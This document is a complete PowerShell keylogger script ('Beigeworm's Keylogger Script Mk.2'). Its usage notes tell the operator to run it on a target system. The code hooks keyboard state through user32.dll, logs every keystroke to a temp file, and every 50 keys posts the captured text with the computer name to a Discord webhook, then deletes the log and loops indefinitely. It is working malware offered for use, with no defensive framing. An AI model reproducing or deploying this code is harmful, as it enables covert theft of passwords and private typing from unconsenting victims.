
<#
============================================= Beigeworm's Keylogger Script Mk.2 ========================================================

SYNOPSIS
This script gathers Keypress information and posts to a discord webhook address with the results after every 50 keys pressed.

USAGE
1. Input your credentials below
2. Run Script on target System
3. Check Discord for results

#>

# User Setup
$hookurl = "DICORD_WEBHOOK_HERE"
$Amount = 50  #Change this value to the amount of keys to save before sending to the webhook.

# Import DLL Definitions for keyboard inputs
$API = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

# Add Definitions and save file
$logPath = "$env:temp/t.txt"
$API = Add-Type -MemberDefinition $API -Name 'Win32' -Namespace API -PassThru
$no = New-Item -Path $logPath -ItemType File -Force
$charCount = 0
$fileContent = Get-Content -Path $logPath -Raw

# Start a continuous loop
While ($true){
$keyPressed = $false
try{
# Start a loop that checks the amount of keys to save before message is sent
while ($charCount -lt $Amount) {

# Start the loop with 30 ms delay between keystate check
Start-Sleep -Milliseconds 30
for ($asc = 9; $asc -le 254; $asc++){

# Get the key state. (is any key currently pressed)
$keyst = $API::GetAsyncKeyState($asc)

# If a key is pressed
if ($keyst -eq -32767) {
$keyPressed = $true
$null = [console]::CapsLock

# Translate the keycode to a letter
$vtkey = $API::MapVirtualKey($asc, 3)

# Get the keyboard state and create stringbuilder
$kbst = New-Object Byte[] 256
$checkkbst = $API::GetKeyboardState($kbst)
$logchar = New-Object -TypeName System.Text.StringBuilder

#increase the key counter by 1
$charCount++

# Define the key that was pressed          
if ($API::ToUnicode($asc, $vtkey, $kbst, $logchar, $logchar.Capacity, 0)) 
{
# Add the key to the file
[System.IO.File]::AppendAllText($logPath, $logchar, [System.Text.Encoding]::Unicode) 
}}}}}finally{

# Send the saved keys to a webhook
If ($keyPressed) {
$fileContent = Get-Content -Path $logPath -Raw
$escmsgsys = $fileContent -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = $escmsgsys} | ConvertTo-Json
Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
Remove-Item -Path $logPath -Force
$keyPressed = $false
}
}
# reset counter and delete log file to restart loop
$charCount = 0
Start-Sleep -Milliseconds 10
}

